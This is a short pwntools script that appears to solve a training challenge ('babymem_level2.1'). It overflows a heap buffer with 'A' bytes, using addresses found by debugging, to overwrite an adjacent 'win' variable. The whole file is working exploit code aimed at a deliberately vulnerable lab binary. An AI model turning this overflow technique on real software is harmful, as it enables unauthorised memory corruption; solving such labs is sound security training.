#!/usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary and run it
elf = ELF('/challenge/babymem_level2.1')
io = elf.process()

# Set the buffer heap location by debugging the program with gdb
buffer_heap_address = 0x000055678d0176b0

# Set the buffer heap location by debugging the program with gdb
win_heap_address = 0x000055678d0177c0

# Compute the payload size as: distance_between_buffer_and_win + win_dimension
payload_size = (win_heap_address - buffer_heap_address) + 0x4

# Send the payload size to the program
io.recvuntil(b'Payload size: ')
io.sendline(f"{payload_size}".encode())

# Build and send the payload to the program
PAYLOAD = b'A'*payload_size
io.recvuntil(b'bytes)!')
io.sendline(PAYLOAD)

# Print the output of the program
print(io.recvall().decode())